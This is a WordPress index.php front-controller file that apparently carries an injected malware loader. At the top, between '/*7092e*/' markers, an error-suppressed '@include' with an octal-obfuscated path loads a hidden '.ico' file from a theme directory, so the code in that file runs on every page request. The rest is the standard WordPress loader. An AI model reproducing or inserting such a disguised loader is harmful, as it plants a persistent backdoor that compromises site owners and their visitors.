<?php
/*7092e*/

@include "\057v\141r\057w\167w\057f\157l\153r\151c\145.\143o\155/\167p\055c\157n\164e\156t\057t\150e\155e\163/\146a\144e\144/\0560\0630\0643\141c\063.\151c\157";

/*7092e*/
/**
 * Front to the WordPress application. This file doesn't do anything, but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require( dirname( __FILE__ ) . '/wp-blog-header.php' );
